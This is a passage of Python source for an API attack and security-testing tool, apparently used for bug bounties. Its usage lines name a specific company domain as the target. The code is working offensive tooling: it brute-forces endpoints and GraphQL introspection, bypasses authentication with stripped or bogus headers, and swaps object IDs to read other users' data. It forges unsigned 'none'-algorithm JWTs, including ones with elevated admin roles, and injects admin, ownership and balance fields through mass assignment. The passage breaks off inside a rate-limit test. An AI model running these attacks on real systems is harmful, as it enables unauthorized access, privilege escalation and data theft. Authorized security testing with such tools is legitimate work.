#!/usr/bin/env python3
"""
apifuzz.py — REST & GraphQL API Security Tester
================================================
Author  : RareKez / security research tooling
License : MIT (for authorized use only)

Chains from : jsreaper.py (--js)  — uses extracted endpoints + parameters
              reconharvest.py (--scan) — uses open port / service data
              plain URL list (--urls)
Feeds into  : ssrfprobe.py, paramfuzz.py, bug bounty reports

Pipeline:
  1. Collect API endpoints from jsreaper output, OpenAPI/Swagger specs,
     common path brute-force, and GraphQL introspection
  2. For each endpoint, run the full test matrix:
       a. BOLA/IDOR — swap numeric IDs and UUIDs across sessions
       b. Broken authentication — remove/alter auth headers/tokens
       c. JWT attacks — none-alg, alg confusion, role manipulation
       d. Mass assignment — inject undocumented fields
       e. Rate limit absence — burst 20 identical requests
       f. HTTP verb tampering — GET/POST/PUT/DELETE on same path
       g. GraphQL-specific — introspection, batch abuse, alias overload,
          deep query, field stuffing, mutation IDOR
       h. CORS per-endpoint — complement headeraudit.py
  3. Response diff engine — compares auth vs unauth, user A vs user B
  4. Classify findings by severity with CVSS estimates
  5. Generate JSON + HTML report with curl PoC per finding

Usage:
  python3 apifuzz.py --js js-findings.json --domain eskimi.com --output api
  python3 apifuzz.py --scan recon-report-v2.json --domain eskimi.com --output api
  python3 apifuzz.py --urls endpoints.txt --domain eskimi.com --output api
  python3 apifuzz.py --js js-findings.json --domain eskimi.com \
      --session-a "Bearer TOKEN_A" --session-b "Bearer TOKEN_B" --output api
  python3 apifuzz.py --spec openapi.json --domain eskimi.com --output api

LEGAL: Only use against targets you have explicit written authorization to test.
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import copy
import datetime
import hashlib
import json
import math
import re
import socket
import sys
import time
import uuid
from dataclasses import dataclass, field, asdict
from typing import Any
from urllib.parse import urlparse, urljoin, urlencode, parse_qs

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import (
        Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    )
    from rich.panel import Panel
    from rich.markup import escape
    HAS_RICH = True
    console = Console()
except ImportError:
    HAS_RICH = False
    console = None

import logging
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger("apifuzz")
for _n in ("httpx", "httpcore"):
    logging.getLogger(_n).setLevel(logging.WARNING)


# ═════════════════════════════════════════════════════════════════════════════
# CONSTANTS & TEST DATA
# ═════════════════════════════════════════════════════════════════════════════

UA = "Mozilla/5.0 (compatible; APIFuzz/1.0)"

# Module-level User-Agent override (C18) — set via --user-agent so all
# requests from this script use the operator-supplied UA.
_USER_AGENT = UA


def set_user_agent(value: str) -> None:
    global _USER_AGENT
    _USER_AGENT = value or UA


def user_agent() -> str:
    return _USER_AGENT

# Common API base paths to brute-force when no spec is available
API_BASE_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/rest", "/rest/v1", "/rest/v2",
    "/graphql", "/query", "/gql",
    "/v1", "/v2", "/v3",
    "/swagger.json", "/openapi.json", "/openapi.yaml",
    "/swagger/v1/swagger.json", "/api-docs", "/api-docs.json",
    "/.well-known/openapi.json",
    "/api/swagger", "/api/openapi",
]

# Common resource paths to test for BOLA/IDOR
RESOURCE_PATHS = [
    "/users", "/user", "/accounts", "/account",
    "/orders", "/order", "/products", "/product",
    "/items", "/item", "/posts", "/post",
    "/messages", "/message", "/files", "/file",
    "/invoices", "/invoice", "/reports", "/report",
    "/profile", "/profiles", "/settings",
    "/admin/users", "/admin/accounts", "/internal/users",
    "/api/v1/users", "/api/v1/accounts", "/api/v1/orders",
    "/api/v2/users", "/api/v2/accounts",
    "/me", "/self", "/whoami",
]

# Mass assignment test fields — injected into POST/PUT body
MASS_ASSIGN_FIELDS = {
    # Privilege escalation
    "role":           ["admin", "superuser", "root", "manager", "staff"],
    "is_admin":       [True, 1, "true", "1"],
    "admin":          [True, 1, "true"],
    "is_staff":       [True, 1],
    "is_superuser":   [True, 1],
    "permissions":    ["admin", "*", ["read","write","admin"]],
    "account_type":   ["admin", "premium", "enterprise", "internal"],
    "tier":           ["enterprise", "premium", "unlimited"],
    "plan":           ["enterprise", "premium", "unlimited"],
    "verified":       [True, 1, "true"],
    "email_verified": [True, 1],
    # Relationship / ownership manipulation
    "owner_id":       [1, 2, "1"],
    "user_id":        [1, 2, "1"],
    "account_id":     [1, 2, "1"],
    "organization_id":[1, "1"],
    # Credit / balance manipulation
    "balance":        [99999, 999999],
    "credits":        [99999],
    "tokens":         [99999],
    # Read-only field injection
    "id":             [1, 99999],
    "created_at":     ["2020-01-01T00:00:00Z"],
}

# JWT algorithm confusion test values
JWT_NONE_HEADER = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b"=").decode()

# GraphQL introspection query
GQL_INTROSPECTION = """
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind }
        args { name type { name kind } }
      }
    }
  }
}
""".strip()

GQL_TYPENAME = "{ __typename }"

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEV_COLOR = {
    "CRITICAL": "bold red", "HIGH": "bold yellow",
    "MEDIUM": "yellow", "LOW": "cyan", "INFO": "dim",
}
SEV_EMOJI = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵", "INFO": "⚪"}


# ═════════════════════════════════════════════════════════════════════════════
# DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class APIEndpoint:
    url: str
    method: str                            # GET POST PUT PATCH DELETE
    host: str
    path: str
    params: list[str] = field(default_factory=list)   # path params like {id}
    query_params: list[str] = field(default_factory=list)
    body_fields: list[str] = field(default_factory=list)
    requires_auth: bool = False
    content_type: str = "application/json"
    source: str = "jsreaper"               # jsreaper | spec | brute | graphql


@dataclass
class APIFinding:
    host: str
    url: str
    method: str
    test_type: str                         # "BOLA" | "AUTH_BYPASS" | "MASS_ASSIGN" | etc.
    severity: str
    title: str
    detail: str
    evidence: str                          # response diff or key detail
    curl_command: str
    recommendation: str
    cvss_estimate: str = ""
    response_snippet: str = ""
    # --- NEW (toolkit integration, ARCHITECTURE.md §5 Tier 1) ---
    # Structured replay request — lets idor_crosssession.py replay without
    # parsing curl_command. Populated by _build_curl-using call sites via
    # the new _record_replay() helper. Backwards-compatible: defaults empty.
    replay_request: dict = field(default_factory=dict)  # {method, url, headers, body}


@dataclass
class HostAPIResult:
    host: str
    ip: str
    endpoints_found: list[APIEndpoint] = field(default_factory=list)
    findings: list[APIFinding] = field(default_factory=list)
    graphql_schema: dict | None = None
    has_swagger: bool = False
    error: str = ""


@dataclass
class APIReport:
    domain: str
    scan_time: str
    source_file: str
    total_hosts: int = 0
    total_endpoints: int = 0
    elapsed_seconds: float = 0.0
    host_results: list[HostAPIResult] = field(default_factory=list)
    all_findings: list[APIFinding] = field(default_factory=list)


# ═════════════════════════════════════════════════════════════════════════════
# HTTP CLIENT HELPERS
# ═════════════════════════════════════════════════════════════════════════════

def _build_curl(
    url: str,
    method: str = "GET",
    headers: dict | None = None,
    body: Any = None,
) -> str:
    parts = ["curl -sk -D -"]
    if method.upper() != "GET":
        parts.append(f"-X {method.upper()}")
    for k, v in (headers or {}).items():
        parts.append(f'-H "{k}: {v}"')
    if body is not None:
        if isinstance(body, dict):
            escaped = json.dumps(body).replace("'", "'\\''")
            parts.append(f"--data-raw '{escaped}'")
            if not headers or "Content-Type" not in headers:
                parts.append('-H "Content-Type: application/json"')
        else:
            parts.append(f"--data-raw '{body}'")
    parts.append(f'"{url}"')
    return " \\\n  ".join(parts)


async def api_request(
    url: str,
    method: str = "GET",
    headers: dict | None = None,
    body: Any = None,
    timeout: float = 10.0,
    follow_redirects: bool = False,
) -> tuple[int | None, dict, str, int]:
    """
    Generic async HTTP request.
    Returns (status, resp_headers, body_text[:3000], content_length).
    Never raises.
    """
    if not HAS_HTTPX:
        return None, {}, "", 0
    hdrs = {
        "User-Agent": user_agent(),
        "Accept": "application/json, text/html, */*;q=0.8",
        **(headers or {}),
    }
    try:
        async with httpx.AsyncClient(
            timeout=timeout,
            verify=False,
            follow_redirects=follow_redirects,
        ) as c:
            if method.upper() == "GET":
                resp = await c.get(url, headers=hdrs)
            elif method.upper() == "POST":
                if isinstance(body, dict):
                    resp = await c.post(url, headers=hdrs, json=body)
                else:
                    resp = await c.post(url, headers=hdrs, content=body or "")
            elif method.upper() == "PUT":
                resp = await c.put(url, headers=hdrs, json=body or {})
            elif method.upper() == "PATCH":
                resp = await c.patch(url, headers=hdrs, json=body or {})
            elif method.upper() == "DELETE":
                resp = await c.delete(url, headers=hdrs)
            elif method.upper() == "OPTIONS":
                resp = await c.options(url, headers=hdrs)
            else:
                resp = await c.request(method, url, headers=hdrs)
            body_text = resp.text[:3000]
            return resp.status_code, dict(resp.headers), body_text, len(resp.content)
    except Exception as exc:
        log.debug(f"[API] {method} {url}: {exc}")
        return None, {}, "", 0


def _looks_like_jwt(token: str) -> bool:
    parts = token.split(".")
    return len(parts) == 3 and all(parts)


def detect_session_shape(token: str) -> str:
    """Classify a --session-a/--session-b value so it is sent with the right
    header. Previously any raw value was wrapped as `Bearer <value>`, which
    silently broke cookie-shaped sessions. Shapes:
      jwt    — `Bearer <JWT>` or a bare 3-part JWT
      bearer — `Bearer <opaque>`
      basic  — `Basic <...>`
      cookie — `Cookie: a=b` or bare `name=value`
      raw    — opaque token (default → Bearer)
      none   — empty
    """
    t = (token or "").strip()
    if not t:
        return "none"
    low = t.lower()
    if low.startswith("bearer "):
        return "jwt" if _looks_like_jwt(t[len("bearer "):].strip()) else "bearer"
    if low.startswith("basic "):
        return "basic"
    if low.startswith("cookie:"):
        return "cookie"
    # bare cookie: single `name=value` (not a JWT, not JSON)
    if re.match(r"^[A-Za-z0-9_\-]+=[^=]+$", t) and not _looks_like_jwt(t):
        return "cookie"
    if _looks_like_jwt(t):
        return "jwt"
    return "raw"


def build_auth_headers(token: str | None) -> dict:
    """Build the auth headers for a session token, honouring its detected
    shape. Cookie-shaped tokens go in a `Cookie:` header instead of being
    wrongly wrapped as `Bearer <name=value>`."""
    if not token:
        return {}
    t = token.strip()
    shape = detect_session_shape(t)
    if shape == "cookie":
        cookie_val = t
        if t.lower().startswith("cookie:"):
            cookie_val = t[len("cookie:"):].strip()
        return {"Cookie": cookie_val}
    if shape in ("jwt", "bearer"):
        return {"Authorization": t if t.lower().startswith("bearer ") else f"Bearer {t}"}
    if shape == "basic":
        return {"Authorization": t}
    # raw → Bearer by default
    return {"Authorization": f"Bearer {t}"}


def _auth_headers(token: str | None) -> dict:
    """Backwards-compatible wrapper — now shape-aware (C16)."""
    return build_auth_headers(token)


# ═════════════════════════════════════════════════════════════════════════════
# API DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

async def discover_api_paths(
    base_url: str,
    host: str,
    auth_token: str | None,
    timeout: float,
) -> tuple[list[APIEndpoint], bool, dict | None]:
    """
    Discover API endpoints from:
     1. Common path brute-force
     2. OpenAPI/Swagger spec if found
     3. GraphQL introspection if /graphql responds
    Returns (endpoints, has_swagger, gql_schema_or_None)
    """
    endpoints: list[APIEndpoint] = []
    has_swagger = False
    gql_schema = None
    hdrs = _auth_headers(auth_token)
    seen_paths: set[str] = set()

    def add_ep(path: str, method: str = "GET", **kwargs) -> None:
        if path in seen_paths:
            return
        seen_paths.add(path)
        url = base_url.rstrip("/") + path
        parsed = urlparse(url)
        params = re.findall(r'\{([^}]+)\}|:([a-zA-Z_][a-zA-Z0-9_]*)', path)
        flat_params = [p[0] or p[1] for p in params]
        endpoints.append(APIEndpoint(
            url=url, method=method, host=host,
            path=path, params=flat_params, **kwargs
        ))

    # ── 1. Probe common API base paths ──────────────────────────────────
    for path in API_BASE_PATHS:
        url = base_url.rstrip("/") + path
        status, resp_hdrs, body, _ = await api_request(url, headers=hdrs, timeout=timeout)
        if status is None:
            continue
        if status in (200, 201):
            add_ep(path, source="brute")
            # Try to parse OpenAPI/Swagger
            if any(kw in path for kw in ["swagger", "openapi", "api-docs"]) or \
               "swagger" in body.lower() or '"openapi"' in body or '"swagger"' in body:
                has_swagger = True
                parsed_spec = _parse_openapi(body, base_url, host)
                endpoints.extend(
                    ep for ep in parsed_spec if ep.url not in {e.url for e in endpoints}
                )
        elif status in (401, 403):
            # Endpoint exists but requires auth — still valuable
            add_ep(path, requires_auth=True, source="brute")

    # ── 2. Resource path brute-force for BOLA/IDOR ──────────────────────
    for path in RESOURCE_PATHS:
        if path in seen_paths:
            continue
        url = base_url.rstrip("/") + path
        status, _, _, _ = await api_request(url, headers=hdrs, timeout=timeout)
        if status in (200, 201, 401, 403):
            add_ep(path, source="brute")
            # Add ID variants
            for suffix in ["/1", "/2", f"/{uuid.uuid4()}"]:
                add_ep(path + suffix, source="brute")

    # ── 3. GraphQL detection ──────────────────────────────────────────────
    for gql_path in ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql"]:
        if gql_path in seen_paths:
            continue
        url = base_url.rstrip("/") + gql_path
        # Try introspection
        status, resp_hdrs, body, _ = await api_request(
            url, method="POST",
            headers={**hdrs, "Content-Type": "application/json"},
            body={"query": GQL_INTROSPECTION},
            timeout=timeout,
        )
        if status in (200, 201) and "data" in body and "__schema" in body:
            add_ep(gql_path, method="POST", source="graphql")
            try:
                gql_schema = json.loads(body).get("data", {}).get("__schema")
            except Exception:
                pass
            log.info(f"[{host}] GraphQL introspection enabled at {gql_path}")
            break
        elif status in (200, 400):
            # GraphQL endpoint exists but introspection may be disabled
            # Try a simple __typename query
            status2, _, body2, _ = await api_request(
                url, method="POST",
                headers={**hdrs, "Content-Type": "application/json"},
                body={"query": GQL_TYPENAME},
                timeout=timeout,
            )
            if status2 == 200 and "__typename" in body2:
                add_ep(gql_path, method="POST", source="graphql")

    log.info(f"[{host}] Discovered {len(endpoints)} API endpoints")
    return endpoints, has_swagger, gql_schema


def _parse_openapi(spec_text: str, base_url: str, host: str) -> list[APIEndpoint]:
    """
    Parse OpenAPI 2.0 or 3.x spec and extract all endpoints.
    Returns list of APIEndpoint.
    """
    endpoints: list[APIEndpoint] = []
    try:
        spec = json.loads(spec_text)
    except Exception:
        return endpoints

    # Determine base path
    if "basePath" in spec:   # Swagger 2.0
        api_base = spec.get("basePath", "")
    else:                     # OpenAPI 3.x
        servers = spec.get("servers", [])
        server_url = servers[0].get("url", "") if servers else ""
        if server_url.startswith("http"):
            parsed_base = urlparse(server_url)
            api_base = parsed_base.path
        else:
            api_base = server_url

    paths = spec.get("paths", {})
    for path, path_item in paths.items():
        if not isinstance(path_item, dict):
            continue
        for method, op in path_item.items():
            if method.lower() not in ("get","post","put","patch","delete","options"):
                continue
            if not isinstance(op, dict):
                continue
            full_path = api_base.rstrip("/") + path
            url = base_url.rstrip("/") + full_path

            # Extract parameters
            params_list  = op.get("parameters", []) + path_item.get("parameters", [])
            path_params  = [p["name"] for p in params_list if p.get("in") == "path"]
            query_params = [p["name"] for p in params_list if p.get("in") == "query"]
            body_fields: list[str] = []

            # OpenAPI 3 request body
            req_body = op.get("requestBody", {})
            for ct, ct_val in req_body.get("content", {}).items():
                schema = ct_val.get("schema", {})
                body_fields.extend(schema.get("properties", {}).keys())

            # Swagger 2 body params
            for p in params_list:
                if p.get("in") == "body":
                    schema = p.get("schema", {})
                    body_fields.extend(schema.get("properties", {}).keys())

            requires_auth = bool(op.get("security") or spec.get("security"))
            endpoints.append(APIEndpoint(
                url=url, method=method.upper(), host=host,
                path=full_path, params=path_params,
                query_params=query_params, body_fields=body_fields,
                requires_auth=requires_auth,
                source="spec",
            ))

    log.info(f"  Parsed {len(endpoints)} endpoints from OpenAPI spec")
    return endpoints


# ═════════════════════════════════════════════════════════════════════════════
# TEST MODULES
# Each returns a list[APIFinding]
# ═════════════════════════════════════════════════════════════════════════════

class APITester:
    def __init__(
        self,
        domain: str,
        session_a: str | None = None,
        session_b: str | None = None,
        timeout: float = 10.0,
    ):
        self.domain    = domain
        self.session_a = session_a
        self.session_b = session_b
        self.timeout   = timeout

    # ── AUTH BYPASS ───────────────────────────────────────────────────────

    async def test_auth_bypass(self, ep: APIEndpoint) -> list[APIFinding]:
        """
        Test whether endpoints that appear to require auth can be accessed
        without credentials or with stripped/malformed auth headers.
        """
        findings: list[APIFinding] = []
        if not ep.requires_auth and not self.session_a:
            return findings

        # Baseline with auth (if we have a token)
        auth_hdrs   = _auth_headers(self.session_a)
        s_auth, h_auth, b_auth, len_auth = await api_request(
            ep.url, ep.method, headers=auth_hdrs, timeout=self.timeout
        )

        # Tests to run
        auth_tests: list[tuple[str, dict]] = [
            ("No Authorization header",      {}),
            ("Empty Authorization header",   {"Authorization": ""}),
            ("Null Bearer token",            {"Authorization": "Bearer null"}),
            ("Bearer undefined",            {"Authorization": "Bearer undefined"}),
            ("Bearer 0",                    {"Authorization": "Bearer 0"}),
            ("Invalid JWT (none-alg)",      {"Authorization": f"Bearer {JWT_NONE_HEADER}.."}),
        ]

        for test_name, test_hdrs in auth_tests:
            s, h, b, blen = await api_request(
                ep.url, ep.method, headers=test_hdrs, timeout=self.timeout
            )
            if s is None:
                continue

            # Is it a bypass? A non-401/403 response with meaningful content.
            if s in (200, 201) and (
                blen > 50 or
                re.search(r'"data"\s*:', b) or
                re.search(r'"result"\s*:', b) or
                re.search(r'"success"\s*:\s*true', b)
            ):
                # Make sure it's not just a "not found" or empty page
                if not re.search(r'"error"', b[:200]) and not re.search(r'not found', b[:200], re.I):
                    findings.append(APIFinding(
                        host=ep.host, url=ep.url, method=ep.method,
                        test_type="AUTH_BYPASS",
                        severity="HIGH",
                        title=f"Authentication Bypass — {test_name}",
                        detail=(
                            f"The endpoint {ep.url} returned HTTP {s} with "
                            f"{blen} bytes of content when accessed with '{test_name}'. "
                            f"Expected 401 or 403."
                        ),
                        evidence=(
                            f"Request: {ep.method} {ep.url}  Headers: {test_hdrs}\n"
                            f"Response: HTTP {s}  Body: {b[:200]}"
                        ),
                        curl_command=_build_curl(ep.url, ep.method, test_hdrs),
                        recommendation=(
                            "Enforce authentication middleware on all protected endpoints. "
                            "Validate Authorization header server-side on every request, "
                            "not just at the gateway layer."
                        ),
                        cvss_estimate="8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)",
                        response_snippet=b[:500],
                    ))
                    break  # One auth bypass finding per endpoint is enough

        return findings

    # ── BOLA / IDOR ───────────────────────────────────────────────────────

    async def test_bola(self, ep: APIEndpoint) -> list[APIFinding]:
        """
        Broken Object Level Authorisation.
        Tests whether swapping the resource ID in the URL returns another
        user's data. Requires two sessions (session_a + session_b) for
        definitive confirmation. Falls back to single-session heuristics.
        """
        findings: list[APIFinding] = []

        # Only test paths that have a numeric or UUID parameter
        id_pattern = re.compile(r'/(\d+|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:/|$)')
        m = id_pattern.search(ep.path)
        if not m:
            # Try to find if this is a resource collection endpoint
            # (e.g. /users — test /users/1, /users/2, /users/999999)
            resource_like = any(
                ep.path.endswith(r) or ep.path.endswith(r + "/")
                for r in ["/users", "/accounts", "/orders", "/items", "/products", "/messages"]
            )
            if not resource_like:
                return findings

        auth_a = _auth_headers(self.session_a) if self.session_a else {}
        auth_b = _auth_headers(self.session_b) if self.session_b else {}

        # ── Case 1: Two sessions available — definitive IDOR test ────────
        if self.session_a and self.session_b:
            # Get object with session A
            s_a, h_a, b_a, len_a = await api_request(
                ep.url, "GET", headers=auth_a, timeout=self.timeout
            )
            if s_a not in (200, 201):
                return findings

            # Try to access with session B
            s_b, h_b, b_b, len_b = await api_request(
                ep.url, "GET", headers=auth_b, timeout=self.timeout
            )

            if s_b in (200, 201) and len_b > 50:
                # Both sessions can access — check if response content is the same
                # If different users get the same resource, that's IDOR
                body_sim = _body_similarity(b_a, b_b)
                if body_sim > 0.7:   # very similar content
                    findings.append(APIFinding(
                        host=ep.host, url=ep.url, method="GET",
                        test_type="BOLA",
                        severity="CRITICAL",
                        title=f"BOLA/IDOR — Cross-User Resource Access Confirmed",
                        detail=(
                            f"Both User A (session_a) and User B (session_b) can access "
                            f"{ep.url} and receive the same response ({round(body_sim*100)}% similarity). "
                            f"User A's resource is accessible to User B without ownership check."
                        ),
                        evidence=(
                            f"Session A response: HTTP {s_a} ({len_a}B)\n"
                            f"Session B response: HTTP {s_b} ({len_b}B)\n"
                            f"Body similarity: {round(body_sim*100)}%"
                        ),
                        curl_command=_build_curl(ep.url, "GET", auth_b),
                        recommendation=(
                            "Implement server-side object ownership checks on every "
                            "resource access. Verify the requesting user owns or has "
                            "explicit permission for the requested object ID."
                        ),
                        cvss_estimate="8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)",
                        response_snippet=b_b[:500],
                        replay_request={"method": "GET", "url": ep.url,
                                        "headers": auth_b or {}, "body": None},
                    ))

        # ── Case 2: Single session — predictable ID fuzzing ───────────────
        else:
            # If URL has a numeric ID, try adjacent IDs (1, 2, 3, id+1, id-1)
            current_id_m = id_pattern.search(ep.url)
            if current_id_m:
                current_id = current_id_m.group(1)
                try:
                    current_num = int(current_id)
                    test_ids = [1, 2, 3, current_num + 1, current_num - 1]
                    test_ids = [i for i in test_ids if i > 0 and str(i) != current_id]
                except ValueError:
                    # UUID — try a random one
                    test_ids_str = [str(uuid.uuid4())]
                    test_ids = []

                s_orig, _, b_orig, len_orig = await api_request(
                    ep.url, "GET", headers=auth_a, timeout=self.timeout
                )
                if s_orig not in (200, 201):
                    return findings

                for test_id in (test_ids or test_ids_str)[:3]:
                    test_url = re.sub(
                        r'/' + re.escape(str(current_id)) + r'(?=/|$)',
                        f'/{test_id}',
                        ep.url, count=1,
                    )
                    s_t, _, b_t, len_t = await api_request(
                        test_url, "GET", headers=auth_a, timeout=self.timeout
                    )
                    if s_t in (200, 201) and len_t > 50:
                        findings.append(APIFinding(
                            host=ep.host, url=test_url, method="GET",
                            test_type="BOLA",
                            severity="HIGH",
                            title=f"Possible BOLA/IDOR — Predictable ID Access",
                            detail=(
                                f"Accessing resource with ID={test_id} on {test_url} "
                                f"returned HTTP {s_t} with {len_t} bytes of data. "
                                f"The original ID was {current_id}. Provide two session "
                                f"tokens (--session-a, --session-b) for definitive confirmation."
                            ),
                            evidence=(
                                f"Original: GET {ep.url} → HTTP {s_orig} ({len_orig}B)\n"
                                f"Modified: GET {test_url} → HTTP {s_t} ({len_t}B)"
                            ),
                            curl_command=_build_curl(test_url, "GET", auth_a),
                            recommendation=(
                                "Verify object ownership before returning any resource. "
                                "Use session-bound identifiers rather than sequential integers."
                            ),
                            cvss_estimate="7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
                            response_snippet=b_t[:500],
                            replay_request={"method": "GET", "url": test_url,
                                            "headers": auth_a or {}, "body": None},
                        ))
                        break

        return findings

    # ── JWT ATTACKS ───────────────────────────────────────────────────────

    async def test_jwt(self, ep: APIEndpoint) -> list[APIFinding]:
        """
        Test common JWT vulnerabilities:
        - Algorithm confusion (none-alg)
        - Role/claim manipulation with none-alg
        - Key confusion (RS256 → HS256)
        """
        findings: list[APIFinding] = []
        if not self.session_a:
            return findings

        # Extract JWT from session token
        token = self.session_a
        if token.startswith("Bearer "):
            token = token[7:]

        # Validate it looks like a JWT
        parts = token.split(".")
        if len(parts) != 3:
            return findings

        try:
            # Decode header and payload
            def _decode_part(s: str) -> dict:
                pad = 4 - len(s) % 4
                return json.loads(base64.urlsafe_b64decode(s + "=" * pad))

            header  = _decode_part(parts[0])
            payload = _decode_part(parts[1])
        except Exception:
            return findings

        # ── Test 1: Algorithm "none" ──────────────────────────────────────
        none_header  = base64.urlsafe_b64encode(
            json.dumps({**header, "alg": "none"}).encode()
        ).rstrip(b"=").decode()
        none_payload = parts[1]
        none_token   = f"{none_header}.{none_payload}."   # empty signature

        s, h, b, blen = await api_request(
            ep.url, ep.method,
            headers={"Authorization": f"Bearer {none_token}"},
            timeout=self.timeout,
        )
        if s in (200, 201) and blen > 50:
            findings.append(APIFinding(
                host=ep.host, url=ep.url, method=ep.method,
                test_type="JWT_NONE",
                severity="CRITICAL",
                title="JWT Algorithm Confusion — 'none' Algorithm Accepted",
                detail=(
                    f"The server accepted a JWT with algorithm set to 'none' and an empty "
                    f"signature at {ep.url}. An attacker can forge arbitrary JWT tokens by "
                    f"setting alg=none and modifying any claim (role, user_id, email) "
                    f"without knowing the signing key."
                ),
                evidence=(
                    f"Forged token: {none_token[:80]}...\n"
                    f"Response: HTTP {s} ({blen}B)"
                ),
                curl_command=_build_curl(
                    ep.url, ep.method,
                    {"Authorization": f"Bearer {none_token}"},
                ),
                recommendation=(
                    "Explicitly reject JWTs with alg=none in the JWT validation library. "
                    "Use an allowlist of permitted algorithms (e.g. only RS256 or HS256). "
                    "Never trust the alg header from the token itself to select the verification method."
                ),
                cvss_estimate="9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)",
                response_snippet=b[:500],
            ))

        # ── Test 2: Role elevation via none-alg ───────────────────────────
        if "role" in payload or "is_admin" in payload or "admin" in payload:
            elevated_payload = {**payload}
            if "role" in elevated_payload:
                elevated_payload["role"] = "admin"
            if "is_admin" in elevated_payload:
                elevated_payload["is_admin"] = True
            if "admin" in elevated_payload:
                elevated_payload["admin"] = True

            elev_payload_b64 = base64.urlsafe_b64encode(
                json.dumps(elevated_payload).encode()
            ).rstrip(b"=").decode()
            elev_token = f"{none_header}.{elev_payload_b64}."

            s2, _, b2, blen2 = await api_request(
                ep.url, ep.method,
                headers={"Authorization": f"Bearer {elev_token}"},
                timeout=self.timeout,
            )
            if s2 in (200, 201) and blen2 > 50:
                findings.append(APIFinding(
                    host=ep.host, url=ep.url, method=ep.method,
                    test_type="JWT_ROLE_ELEVATION",
                    severity="CRITICAL",
                    title="JWT Role Elevation via Algorithm Confusion",
                    detail=(
                        f"By forging a JWT with alg=none and setting role=admin in the payload, "
                        f"the server accepted the token and returned HTTP {s2}. "
                        f"An attacker can impersonate any user or role without the signing key."
                    ),
                    evidence=(
                        f"Original payload: {json.dumps(payload)[:100]}\n"
                        f"Elevated payload: {json.dumps(elevated_payload)[:100]}\n"
                        f"Response: HTTP {s2} ({blen2}B)"
                    ),
                    curl_command=_build_curl(
                        ep.url, ep.method,
                        {"Authorization": f"Bearer {elev_token}"},
                    ),
                    recommendation=(
                        "Reject JWTs with alg=none. Use asymmetric signing (RS256/ES256) "
                        "and verify against a pinned public key. Never accept algorithm changes "
                        "from the token header."
                    ),
                    cvss_estimate="9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
                    response_snippet=b2[:500],
                ))

        return findings

    # ── MASS ASSIGNMENT ───────────────────────────────────────────────────

    async def test_mass_assignment(self, ep: APIEndpoint) -> list[APIFinding]:
        """
        Inject undocumented privileged fields into POST/PUT/PATCH bodies.
        A mass assignment vulnerability exists when the server accepts and
        stores fields that should not be user-controllable.
        """
        findings: list[APIFinding] = []
        if ep.method not in ("POST", "PUT", "PATCH"):
            return findings

        auth_hdrs = _auth_headers(self.session_a)

        # Get baseline response to the endpoint with minimal body
        s_base, _, b_base, len_base = await api_request(
            ep.url, ep.method, headers=auth_hdrs,
            body={}, timeout=self.timeout,
        )
        if s_base is None:
            return findings

        # Test each mass assignment field
        for field_name, test_values in MASS_ASSIGN_FIELDS.items():
            for val in test_values[:1]:   # one value per field to keep request count down
                injected_body = {field_name: val}
                # Also include known body fields from the spec
                for bf in (ep.body_fields or []):
                    if bf not in injected_body:
                        injected_body[bf] = "test"

                s, _, b, blen = await api_request(
                    ep.url, ep.method, headers={
                        **auth_hdrs,
                        "Content-Type": "application/json",
                    },
                    body=injected_body, timeout=self.timeout,
                )
                if s is None:
                    continue

                # Server accepted the field (non-400, non-422 response)
                # and the field name appears in the response = stored
                field_reflected = field_name in b or str(val) in b[:500]
                server_accepted = s not in (400, 422, 415) and s not in (None,)

                if server_accepted and field_reflected and s in (200, 201):
                    findings.append(APIFinding(
                        host=ep.host, url=ep.url, method=ep.method,
                        test_type="MASS_ASSIGN",
                        severity="HIGH",
                        title=f"Mass Assignment — Field '{field_name}' Accepted and Reflected",
                        detail=(
                            f"Injecting field '{field_name}={val}' into a {ep.method} request "
                            f"to {ep.url} returned HTTP {s} and the field/value appeared in the "
                            f"response body. This suggests the server is binding all request "
                            f"body properties to the model without allowlisting."
                        ),
                        evidence=(
                            f"Request body: {json.dumps(injected_body)[:200]}\n"
                            f"Response: HTTP {s}  Body contains '{field_name}': {field_reflected}"
                        ),
                        curl_command=_build_curl(
                            ep.url, ep.method,
                            {**auth_hdrs, "Content-Type": "application/json"},
                            injected_body,
                        ),
                        recommendation=(
                            "Use an explicit allowlist (DTO/form validation) for all "
                            "request body parameters. Never use patterns like "
                            "User.update(request.body) or equivalent ORM bulk-assign methods "
                            "with untrusted input."
                        ),
                        cvss_estimate="8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)",
                        response_snippet=b[:500],
                    ))
                    break  # one finding per endpoint

        return findings

    # ── RATE LIMIT ────────────────────────────────────────────────────────

    async def test_rate_limit(self, ep: APIEndpoint) -> list[APIFinding]:
        """
        Send 20 identical requests in rapid succession.
        If none return 429, rate limiting is absent.
        Sensitive paths (login, reset-password, otp) are higher severity.
        """
        findings: list[APIFinding] = []
        auth_hdrs = _auth_headers(self.session_a)
        BURST = 20

        # Fire all requests concurrently
        tasks = [
